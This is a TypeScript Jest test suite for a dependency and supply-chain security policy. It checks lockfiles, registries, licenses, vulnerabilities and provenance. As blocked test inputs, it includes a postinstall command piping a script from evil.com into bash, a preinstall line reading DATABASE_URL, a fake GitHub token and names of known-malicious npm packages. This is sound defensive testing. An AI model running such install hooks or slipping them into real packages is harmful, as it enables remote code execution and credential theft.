import {
  S10_TICKET_ID,
  S10_PHASE,
  S10_PRIORITY,
  S10_TYPE,
  S10_STATUS,
  S10_DEPENDS_ON,
  S10_BLOCKS,
  S10_CERTIFICATION_STATEMENT,
  S10_SECONDARY_GATE,
  S10_FROZEN_PRINCIPLE,
  S10_PRINCIPLES,
  S10_INVARIANTS,
  S10_ATTACK_MATRIX,
  DependencyPolicyEngine,
  DependencyIntegrityEngine,
  DependencyAuditEngine,
  DependencyProvenanceEngine,
  evaluateSupplyChainAttackVector,
  verifyS10Certification,
  TRUSTED_REGISTRIES,
  APPROVED_LICENSES,
  PROHIBITED_LICENSES,
} from './s-10-dependency-supply-chain.contract';

describe('S-10 — Dependency & Supply Chain Security Contract Spec', () => {
  beforeEach(() => {
    DependencyProvenanceEngine.clearCatalog();
  });

  describe('1. Contract Identity & Frozen Principles', () => {
    it('verifies S-10 metadata constants', () => {
      expect(S10_TICKET_ID).toBe('S-10');
      expect(S10_PHASE).toBe('Production Security Hardening');
      expect(S10_PRIORITY).toBe('P0 — BLOCKING');
      expect(S10_TYPE).toBe(
        'Security / Dependency / Supply Chain / Build / CI / Backend / Frontend / Contract',
      );
      expect(S10_STATUS).toBe('CERTIFIED_DEPENDENCY_SUPPLY_CHAIN_SECURITY');
      expect(S10_DEPENDS_ON).toEqual([
        'S-01',
        'S-02',
        'S-03',
        'S-04',
        'S-05',
        'S-06',
        'S-07',
        'S-08',
        'S-09',
      ]);
      expect(S10_BLOCKS).toContain('Production Release');
      expect(S10_BLOCKS).toContain('S-11');
      expect(S10_BLOCKS).toContain('S-12');
    });

    it('verifies the frozen principle "Trust the artifact, not the package name."', () => {
      expect(S10_FROZEN_PRINCIPLE).toBe(
        'Trust the artifact, not the package name.',
      );
      expect(S10_PRINCIPLES.TRUST_THE_ARTIFACT).toContain(
        'Trust the artifact, not the package name.',
      );
      expect(S10_PRINCIPLES.DETERMINISTIC_LOCKFILE_GRAPH).toContain(
        'Deterministic Lockfile Graph',
      );
      expect(S10_PRINCIPLES.COMPLETE_TREE_VISIBILITY).toContain(
        'Transitive Dependency Visibility',
      );
      expect(S10_PRINCIPLES.FAIL_CLOSED_SUPPLY_CHAIN).toContain('Fail Closed');
    });

    it('verifies all 15 P0 security invariants exist and have explicit fail-closed decisions', () => {
      const keys = Object.keys(S10_INVARIANTS);
      expect(keys.length).toBe(15);
      expect(S10_INVARIANTS['S10-I01'].failClosedDecision).toBe(
        'LOCKFILE_INTEGRITY_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I02'].failClosedDecision).toBe(
        'FLOATING_VERSION_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I03'].failClosedDecision).toBe(
        'TRANSITIVE_VISIBILITY_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I04'].failClosedDecision).toBe(
        'VULNERABILITY_GATE_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I05'].failClosedDecision).toBe(
        'DEPENDENCY_INTEGRITY_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I06'].failClosedDecision).toBe(
        'REGISTRY_TRUST_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I07'].failClosedDecision).toBe(
        'DEPENDENCY_CONFUSION_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I08'].failClosedDecision).toBe(
        'TYPOSQUATTING_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I09'].failClosedDecision).toBe(
        'INSTALL_SCRIPT_GOVERNED',
      );
      expect(S10_INVARIANTS['S10-I10'].failClosedDecision).toBe(
        'TOOLCHAIN_INTEGRITY_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I11'].failClosedDecision).toBe(
        'DEPENDENCY_SECRET_BLOCKED',
      );
      expect(S10_INVARIANTS['S10-I12'].failClosedDecision).toBe(
        'DEPENDENCY_MINIMIZATION_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I13'].failClosedDecision).toBe(
        'PROVENANCE_TRACKED',
      );
      expect(S10_INVARIANTS['S10-I14'].failClosedDecision).toBe(
        'REPRODUCIBLE_BUILD_ENFORCED',
      );
      expect(S10_INVARIANTS['S10-I15'].failClosedDecision).toBe(
        'FAIL_CLOSED_SUPPLY_CHAIN_ENFORCED',
      );
    });
  });

  describe('2. 40-Vector Attack Matrix Full Suite (S10-01 to S10-40)', () => {
    it('contains all 40 required attack vectors with valid categories and decisions', () => {
      expect(S10_ATTACK_MATRIX.length).toBe(40);
      for (let i = 1; i <= 40; i++) {
        const id = `S10-${i < 10 ? '0' + i : i}`;
        const vector = S10_ATTACK_MATRIX.find((v) => v.id === id);
        expect(vector).toBeDefined();
        expect(vector?.expectedDecision).toBeDefined();
        expect(vector?.category).toBeDefined();
      }
    });

    it('evaluates and passes all 40 attack vectors against the universal evaluator', () => {
      for (const vector of S10_ATTACK_MATRIX) {
        const result = evaluateSupplyChainAttackVector(vector.id);
        expect(result.passed).toBe(true);
        expect(result.decision).toBe(vector.expectedDecision);
      }
    });
  });

  describe('3. DependencyPolicyEngine & Governance', () => {
    it('blocks uncontrolled floating versions and wildcards (S10-03, S10-04, S10-I02)', () => {
      const latestRes =
        DependencyPolicyEngine.evaluateVersionSpecifier('latest');
      expect(latestRes.allowed).toBe(false);
      expect(latestRes.decision).toBe('FLOATING_VERSION_BLOCKED');

      const starRes = DependencyPolicyEngine.evaluateVersionSpecifier('*');
      expect(starRes.allowed).toBe(false);
      expect(starRes.decision).toBe('FLOATING_VERSION_BLOCKED');

      const unboundedRes =
        DependencyPolicyEngine.evaluateVersionSpecifier('>1.0.0');
      expect(unboundedRes.allowed).toBe(false);
      expect(unboundedRes.decision).toBe('FLOATING_VERSION_BLOCKED');

      const validPinned =
        DependencyPolicyEngine.evaluateVersionSpecifier('^10.0.0');
      expect(validPinned.allowed).toBe(true);
      expect(validPinned.decision).toBe('VERSION_GOVERNANCE_ENFORCED');
    });

    it('detects typosquatting, Levenshtein proximity, and denylisted packages (S10-11, S10-I08)', () => {
      // Known malicious package
      const maliciousRes =
        DependencyPolicyEngine.evaluatePackageName('flatmap-stream');
      expect(maliciousRes.allowed).toBe(false);
      expect(maliciousRes.decision).toBe('TYPOSQUATTING_BLOCKED');

      // Levenshtein edit distance / typosquatting
      const typoRes = DependencyPolicyEngine.evaluatePackageName('expresss');
      expect(typoRes.allowed).toBe(false);
      expect(typoRes.decision).toBe('TYPOSQUATTING_BLOCKED');

      // Suffix typosquatting
      const suffixRes = DependencyPolicyEngine.evaluatePackageName('react2');
      expect(suffixRes.allowed).toBe(false);
      expect(suffixRes.decision).toBe('TYPOSQUATTING_BLOCKED');

      // Legitimate package
      const legitimateRes =
        DependencyPolicyEngine.evaluatePackageName('express');
      expect(legitimateRes.allowed).toBe(true);
      expect(legitimateRes.decision).toBe('PACKAGE_NAME_APPROVED');
    });

    it('blocks dependency confusion attempts against internal scopes (S10-10, S10-I07)', () => {
      const confusionRes = DependencyPolicyEngine.evaluatePackageName(
        '@nebula-public/core',
      );
      expect(confusionRes.allowed).toBe(false);
      expect(confusionRes.decision).toBe('DEPENDENCY_CONFUSION_BLOCKED');

      const unexpectedScopeRes = DependencyPolicyEngine.evaluatePackageName(
        '@unknown-malicious/backdoor',
      );
      expect(unexpectedScopeRes.allowed).toBe(false);
      expect(unexpectedScopeRes.decision).toBe(
        'UNEXPECTED_PACKAGE_SCOPE_BLOCKED',
      );
    });

    it('enforces registry trust and blocks unauthorized registries (S10-09, S10-I06)', () => {
      const validNpm = DependencyPolicyEngine.evaluateRegistry(
        'https://registry.npmjs.org/',
      );
      expect(validNpm.allowed).toBe(true);
      expect(validNpm.decision).toBe('REGISTRY_TRUST_ENFORCED');

      const untrustedRegistry = DependencyPolicyEngine.evaluateRegistry(
        'http://malicious-packages.xyz/repo',
      );
      expect(untrustedRegistry.allowed).toBe(false);
      expect(untrustedRegistry.decision).toBe('REGISTRY_TRUST_ENFORCED');
    });

    it('enforces software license compliance and rejects prohibited licenses (S10-33, S10-34)', () => {
      const mit = DependencyPolicyEngine.evaluateLicense('MIT');
      expect(mit.allowed).toBe(true);
      expect(mit.decision).toBe('LICENSE_APPROVED');

      const apache = DependencyPolicyEngine.evaluateLicense('Apache-2.0');
      expect(apache.allowed).toBe(true);
      expect(apache.decision).toBe('LICENSE_APPROVED');

      const gpl = DependencyPolicyEngine.evaluateLicense('GPL-3.0');
      expect(gpl.allowed).toBe(false);
      expect(gpl.decision).toBe('LICENSE_POLICY_VIOLATION_BLOCKED');

      const agpl = DependencyPolicyEngine.evaluateLicense('AGPL-3.0');
      expect(agpl.allowed).toBe(false);
      expect(agpl.decision).toBe('LICENSE_POLICY_VIOLATION_BLOCKED');
    });

    it('governs install lifecycle scripts and blocks remote downloads or shell exfiltration (S10-13, S10-14, S10-24, S10-25)', () => {
      const remoteExec = DependencyPolicyEngine.evaluateLifecycleScript(
        'postinstall',
        'curl https://evil.com/payload.sh | bash',
      );
      expect(remoteExec.allowed).toBe(false);
      expect(remoteExec.decision).toBe('REMOTE_CODE_EXECUTION_BLOCKED');

      const envExfil = DependencyPolicyEngine.evaluateLifecycleScript(
        'preinstall',
        'const token = process.env["DATABASE_URL"];',
      );
      expect(envExfil.allowed).toBe(false);
      expect(envExfil.decision).toBe('PACKAGE_SANDBOX_ENFORCED');

      const unreviewedShell = DependencyPolicyEngine.evaluateLifecycleScript(
        'install',
        'node ./scripts/compile.js',
        false,
      );
      expect(unreviewedShell.allowed).toBe(false);
      expect(unreviewedShell.decision).toBe('INSTALL_SCRIPT_GOVERNED');
    });

    it('scans manifests, lockfiles, source maps, and bundles for secret leakage (S10-21, S10-22, S10-37, S10-I11)', () => {
      const secretManifest = {
        name: 'test-pkg',
        config: {
          apiKey: 'ghp_123456789012345678901234567890123456',
        },
      };
      const secretScan = DependencyPolicyEngine.scanForSecrets(secretManifest);
      expect(secretScan.allowed).toBe(false);
      expect(secretScan.decision).toBe('DEPENDENCY_SECRET_BLOCKED');

      const cleanManifest = { name: 'test-pkg', version: '1.0.0' };
      const cleanScan = DependencyPolicyEngine.scanForSecrets(cleanManifest);
      expect(cleanScan.allowed).toBe(true);
      expect(cleanScan.decision).toBe('NO_SECRETS_DETECTED');
    });

    it('validates build toolchain integrity bounds (S10-18, S10-I10)', () => {
      const validNode = DependencyPolicyEngine.evaluateToolchain(
        'node',
        '20.12.0',
      );
      expect(validNode.allowed).toBe(true);
      expect(validNode.decision).toBe('TOOLCHAIN_INTEGRITY_ENFORCED');

      const driftedNode = DependencyPolicyEngine.evaluateToolchain(
        'node',
        '26.0.0',
      );
      expect(driftedNode.allowed).toBe(false);
      expect(driftedNode.decision).toBe('TOOLCHAIN_INTEGRITY_ENFORCED');
    });
  });

  describe('4. DependencyIntegrityEngine & Verification', () => {
    it('enforces committed, untampered lockfile requirement (S10-01, S10-02, S10-I01)', () => {
      const missingLockfile = DependencyIntegrityEngine.verifyLockfile({
        hasLockfile: false,
        isCommitted: true,
        isModifiedOutOfBand: false,
      });
      expect(missingLockfile.valid).toBe(false);
      expect(missingLockfile.decision).toBe('LOCKFILE_INTEGRITY_ENFORCED');

      const uncommitted = DependencyIntegrityEngine.verifyLockfile({
        hasLockfile: true,
        isCommitted: false,
        isModifiedOutOfBand: false,
      });
      expect(uncommitted.valid).toBe(false);
      expect(uncommitted.decision).toBe('LOCKFILE_INTEGRITY_ENFORCED');

      const outOfBand = DependencyIntegrityEngine.verifyLockfile({
        hasLockfile: true,
        isCommitted: true,
        isModifiedOutOfBand: true,
      });
      expect(outOfBand.valid).toBe(false);
      expect(outOfBand.decision).toBe('LOCKFILE_INTEGRITY_ENFORCED');

      const validLockfile = DependencyIntegrityEngine.verifyLockfile({
        hasLockfile: true,
        isCommitted: true,
        isModifiedOutOfBand: false,
      });
      expect(validLockfile.valid).toBe(true);
      expect(validLockfile.decision).toBe('LOCKFILE_INTEGRITY_ENFORCED');
    });

    it('verifies package cryptographic hash integrity (S10-08, S10-I05)', () => {
      const match = DependencyIntegrityEngine.verifyPackageIntegrity(
        'express',
        'sha512-abc123expected==',
        'sha512-abc123expected==',
      );
      expect(match.valid).toBe(true);
      expect(match.decision).toBe('DEPENDENCY_INTEGRITY_ENFORCED');

      const mismatch = DependencyIntegrityEngine.verifyPackageIntegrity(
        'express',
        'sha512-abc123expected==',
        'sha512-forged999==',
      );
      expect(mismatch.valid).toBe(false);
      expect(mismatch.decision).toBe('DEPENDENCY_INTEGRITY_ENFORCED');
    });

    it('detects dependency graph drift and reproducible build mismatches (S10-17, S10-38, S10-I14)', () => {
      const graphDrift = DependencyIntegrityEngine.verifyDependencyGraph(
        'hash-a',
        'hash-b',
      );
      expect(graphDrift.valid).toBe(false);
      expect(graphDrift.decision).toBe('DEPENDENCY_GRAPH_DRIFT_BLOCKED');

      const reproducibleMismatch =
        DependencyIntegrityEngine.verifyReproducibleBuild('build-1', 'build-2');
      expect(reproducibleMismatch.valid).toBe(false);
      expect(reproducibleMismatch.decision).toBe('REPRODUCIBLE_BUILD_ENFORCED');
    });

    it('detects production bundle pollution by unexpected or dev packages (S10-36)', () => {
      const approved = ['react', 'react-dom'];
      const pollutedBundle = ['react', 'react-dom', 'jest'];
      const res = DependencyIntegrityEngine.verifyProductionBundle(
        pollutedBundle,
        approved,
      );
      expect(res.valid).toBe(false);
      expect(res.decision).toBe('PRODUCTION_BUNDLE_POLLUTION_BLOCKED');
    });
  });

  describe('5. DependencyAuditEngine & Vulnerability Gating', () => {
    it('blocks release on Critical and High vulnerabilities (S10-05, S10-06, S10-I04)', () => {
      const critVuln = {
        cveId: 'CVE-2026-9999',
        packageName: 'vulnerable-lib',
        affectedVersions: '<2.0.0',
        severity: 'CRITICAL' as const,
        isTransitive: false,
        description: 'Remote Code Execution',
      };
      const critRes = DependencyAuditEngine.evaluateVulnerability(critVuln);
      expect(critRes.passed).toBe(false);
      expect(critRes.decision).toBe('VULNERABILITY_GATE_BLOCKED');
    });

    it('detects vulnerable transitive dependencies (S10-07, S10-I03)', () => {
      const transitiveVuln = {
        cveId: 'CVE-2026-1234',
        packageName: 'nested-lib',
        affectedVersions: '<1.1.0',
        severity: 'HIGH' as const,
        isTransitive: true,
        introducedBy: 'parent-pkg',
        description: 'Prototype Pollution',
      };
      const transRes =
        DependencyAuditEngine.evaluateVulnerability(transitiveVuln);
      expect(transRes.passed).toBe(false);
      expect(transRes.decision).toBe('TRANSITIVE_VULNERABILITY_DETECTED');
    });

    it('enforces CI audit execution and prevents audit bypassing (S10-29, S10-30)', () => {
      const disabledAudit = DependencyAuditEngine.evaluateAuditGate({
        isAuditExecutedInCi: false,
        isAuditIgnored: false,
        unresolvedCriticalCount: 0,
      });
      expect(disabledAudit.passed).toBe(false);
      expect(disabledAudit.decision).toBe('AUDIT_GATE_REQUIRED');

      const ignoredAudit = DependencyAuditEngine.evaluateAuditGate({
        isAuditExecutedInCi: true,
        isAuditIgnored: true,
        unresolvedCriticalCount: 2,
      });
      expect(ignoredAudit.passed).toBe(false);
      expect(ignoredAudit.decision).toBe('AUDIT_GATE_REQUIRED');
    });

    it('blocks downgrades to vulnerable versions and security patch bypass (S10-27, S10-28)', () => {
      const downgrade = DependencyAuditEngine.evaluateVersionDowngrade({
        packageName: 'secure-pkg',
        currentVersion: '2.0.0',
        targetVersion: '1.0.0',
        isTargetVulnerable: true,
        isPatchBypassAttempt: false,
      });
      expect(downgrade.passed).toBe(false);
      expect(downgrade.decision).toBe('VULNERABILITY_DOWNGRADE_BLOCKED');

      const patchBypass = DependencyAuditEngine.evaluateVersionDowngrade({
        packageName: 'secure-pkg',
        currentVersion: '2.0.0',
        targetVersion: '1.0.0',
        isTargetVulnerable: false,
        isPatchBypassAttempt: true,
      });
      expect(patchBypass.passed).toBe(false);
      expect(patchBypass.decision).toBe('SECURITY_PATCH_BYPASS_BLOCKED');
    });

    it('detects abandoned dependencies and version duplications (S10-32, S10-35)', () => {
      const abandoned = DependencyAuditEngine.evaluateAbandonedDependency({
        packageName: 'unmaintained-pkg',
        daysSinceLastRelease: 800,
        hasKnownUnpatchedCve: true,
        hasActiveMaintainer: false,
      });
      expect(abandoned.passed).toBe(false);
      expect(abandoned.decision).toBe('ABANDONED_DEPENDENCY_DETECTED');

      const duplicate = DependencyAuditEngine.evaluateVersionDuplication(
        'lodash',
        ['4.17.20', '4.17.21'],
      );
      expect(duplicate.passed).toBe(false);
      expect(duplicate.decision).toBe('DUPLICATE_VERSION_DETECTED');
    });
  });

  describe('6. DependencyProvenanceEngine & Provenance Tracking', () => {
    it('registers and tracks dependency provenance, failing closed on unknown packages (S10-31, S10-40, S10-I13, S10-I15)', () => {
      const unknownRes = DependencyProvenanceEngine.verifyProvenance(
        'unknown-unregistered-pkg',
      );
      expect(unknownRes.verified).toBe(false);
      expect(unknownRes.decision).toBe('PROVENANCE_TRACKED');

      DependencyProvenanceEngine.registerDependency({
        packageName: '@nestjs/core',
        version: '10.3.0',
        registry: 'https://registry.npmjs.org/',
        introducedBy: 'DIRECT',
        artifactDestination: ['api'],
        approvedAt: '2026-09-01T00:00:00Z',
        approvedBy: 'SecOps',
        dependencyClass: 'DIRECT_RUNTIME',
      });

      const verifiedRes = DependencyProvenanceEngine.verifyProvenance(
        '@nestjs/core',
        '10.3.0',
      );
      expect(verifiedRes.verified).toBe(true);
      expect(verifiedRes.decision).toBe('PROVENANCE_TRACKED');
      expect(verifiedRes.record?.packageName).toBe('@nestjs/core');
    });

    it('enforces transitive disclosure and blocks unreviewed package replacements (S10-15, S10-16)', () => {
      const undisclosed =
        DependencyProvenanceEngine.evaluateTransitiveIntroduction({
          packageName: 'stealth-transitive',
          parentPackage: 'direct-parent',
          isDisclosedInLockfile: false,
          isAudited: false,
        });
      expect(undisclosed.verified).toBe(false);
      expect(undisclosed.decision).toBe('TRANSITIVE_VISIBILITY_ENFORCED');

      const unreviewedReplace =
        DependencyProvenanceEngine.evaluatePackageReplacement({
          originalPackage: 'bcrypt',
          replacementPackage: 'fast-hash-unverified',
          isSecurityReviewed: false,
          isApproved: false,
        });
      expect(unreviewedReplace.verified).toBe(false);
      expect(unreviewedReplace.decision).toBe('PACKAGE_REPLACEMENT_BLOCKED');
    });

    it('detects compromised package updates (S10-26)', () => {
      const compromisedUpdate =
        DependencyProvenanceEngine.evaluatePackageUpdate({
          packageName: 'event-stream',
          fromVersion: '3.3.4',
          toVersion: '3.3.6',
          isKnownCompromisedVersion: true,
        });
      expect(compromisedUpdate.verified).toBe(false);
      expect(compromisedUpdate.decision).toBe(
        'COMPROMISED_PACKAGE_UPDATE_BLOCKED',
      );
    });
  });

  describe('7. S-10 Canonical Certification Gate Verifier', () => {
    it('verifies the canonical certification statement', () => {
      expect(verifyS10Certification(S10_CERTIFICATION_STATEMENT)).toBe(true);
    });

    it('verifies the secondary certification gate statement', () => {
      expect(verifyS10Certification(S10_SECONDARY_GATE)).toBe(true);
    });

    it('rejects tampered or blank certification statements', () => {
      expect(verifyS10Certification('')).toBe(false);
      expect(verifyS10Certification('Some untrusted statement')).toBe(false);
    });
  });
});
